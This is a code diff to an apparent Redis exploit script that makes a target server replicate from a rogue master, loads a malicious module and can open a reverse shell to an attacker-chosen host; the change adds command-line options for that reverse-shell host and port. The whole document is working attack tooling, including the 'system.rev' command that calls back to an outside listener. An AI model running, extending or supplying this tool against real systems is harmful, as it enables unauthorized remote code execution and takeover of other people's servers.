@@ -135,10 +135,17 @@ def interact(remote):
     except KeyboardInterrupt:
         pass
 
-def reverse(remote):
+def reverse(remote, addr=None, port=None):
     info("Open reverse shell...")
-    addr = input("Reverse server address: ")
-    port = input("Reverse server port: ")
+
+    # Get user input only if addr is empty/None
+    if not addr:
+        addr = input("Reverse server address: ")
+
+    # Get user input only if port is empty/None
+    if not port:
+        port = input("Reverse server port: ")
+
     dout(remote, encode_cmd(f"system.rev {addr} {port}"))
     info("Reverse shell payload sent.")
     info(f"Check at {addr}:{port}")
@@ -147,7 +154,7 @@ def cleanup(remote):
     info("Unload module...")
     remote.do("MODULE UNLOAD system")
 
-def runserver(rhost, rport, lhost, lport, passwd):
+def runserver(rhost, rport, lhost, lport, passwd, rvhost, rvport):
     # expolit
     remote = Remote(rhost, rport)
     info("Setting master...")
@@ -175,7 +182,7 @@ def runserver(rhost, rport, lhost, lport, passwd):
     if choice.startswith("i"):
         interact(remote)
     elif choice.startswith("r"):
-        reverse(remote)
+        reverse(remote, rvhost, rvport)
 
     cleanup(remote)
 
@@ -191,6 +198,11 @@ if __name__ == '__main__':
     parser.add_option("--lport", dest="lp", type="int",
             help="rogue server listen port, default 21000", default=21000,
             metavar="LOCAL_PORT")
+    parser.add_option("--rvhost", dest="rvh", type="string",
+            help="reverse shell server ip", metavar="REVERSE_HOST")
+    parser.add_option("--rvport", dest="rvp", type="int",
+            help="reverse shell server listen port, default 9999", default=9999,
+            metavar="REVERSE_PORT")
     parser.add_option("--exp", dest="exp", type="string",
             help="Redis Module to load, default exp.so", default="exp.so",
             metavar="EXP_FILE")
@@ -210,7 +222,8 @@ if __name__ == '__main__':
 
     info(f"TARGET {options.rh}:{options.rp}")
     info(f"SERVER {options.lh}:{options.lp}")
+    info(f"REVERSE SERVER {options.rvh}:{options.rvp}")
     try:
-        runserver(options.rh, options.rp, options.lh, options.lp, options.rpasswd)
+        runserver(options.rh, options.rp, options.lh, options.lp, options.rpasswd, options.rvh, options.rvp)
     except Exception as e:
         error(repr(e))
